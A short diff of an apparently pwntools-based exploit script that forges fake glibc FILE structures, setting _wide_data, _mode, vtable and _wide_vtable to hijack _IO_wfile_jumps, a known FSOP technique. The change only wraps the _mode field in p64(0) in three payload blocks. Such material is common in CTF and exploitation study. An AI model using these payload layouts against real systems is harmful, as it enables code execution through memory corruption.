@@ -56,7 +56,7 @@ payload = flat(
         # fake_file->file._wide_data
         0xA0: fake_file,
         # fake_file->file._mode
-        0xC0: 0,
+        0xC0: p64(0),
         # fake_file->vtable
         0xD8: libc.symbols["_IO_wfile_jumps"],
         # fake_file->file._wide_data->_wide_vtable
@@ -92,7 +92,7 @@ payload = flat(
         # fake_file->file._wide_data
         0xA0: fake_file - 0x10,
         # fake_file->file._mode
-        0xC0: 0,
+        0xC0: p64(0),
         # fake_file->file._wide_data->_wide_vtable
         0xD0: fake_file,
         # fake_file->vtable
@@ -176,7 +176,7 @@ payload = flat(
         # fake_file->file._wide_data
         0xA0: fake_file - 0x10,
         # fake_file->file._mode
-        0xC0: 0,
+        0xC0: p64(0),
         # fake_file->file._wide_data->_wide_vtable
         0xD0: fake_file,
         # fake_file->vtable
